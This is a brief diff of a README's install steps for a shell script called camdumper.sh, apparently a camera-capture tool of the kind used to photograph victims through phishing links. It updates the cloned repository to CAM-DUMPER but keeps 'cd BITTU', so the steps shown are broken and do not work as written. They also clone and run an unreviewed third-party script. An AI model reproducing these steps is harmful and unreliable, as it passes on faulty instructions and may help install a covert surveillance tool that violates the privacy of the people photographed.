@@ -16,7 +16,7 @@
 ```
 $ apt update && apt upgrade
 $ apt install git php wget curl jq
-$ git clone https://github.com/junayedalam09/BITTU.git
+$ git clone https://github.com/junayedalam09/CAM-DUMPER.git
 $ cd BITTU
 $ chmod +x camdumper.sh
 $ ./camdumper.sh
